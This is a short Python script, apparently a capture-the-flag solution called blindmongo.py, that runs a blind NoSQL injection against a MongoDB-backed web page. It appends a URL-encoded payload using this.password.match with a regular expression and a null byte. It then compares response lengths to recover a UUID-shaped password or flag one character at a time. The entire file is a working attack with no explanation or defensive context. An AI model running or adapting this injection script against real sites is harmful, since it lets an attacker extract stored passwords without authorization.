import sys
import requests
    
def exploit(url):
    flag = ""
    
    get_part = url.split('?')[1]
    
    param = get_part.split("=")[0] #get the parameter
    value = get_part.split("=")[1] # get the value 
    
    r = requests.get(url)
    good_length = len(r.content)
    
    nextchar=True
    chars = list("abcdef0123456789-") #valid chars of the flag
    while len(flag) != len("XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX") and nextchar:
            for i in range(0,len(chars)):
                payload="%27%20%26%26%20this.password.match(/^{}.*/)%00".format(flag+chars[i])
                ctf = requests.get(url+payload)
                if len(ctf.content) == good_length:
                    flag+=chars[i]
                    print(flag)
                    nextchar=True
                    break
                else:
                    nextchar=False
        
if (len(sys.argv) == 2):
    exploit(sys.argv[1])
else:
    print("Usage: python3 blindmongo.py url")
    
    
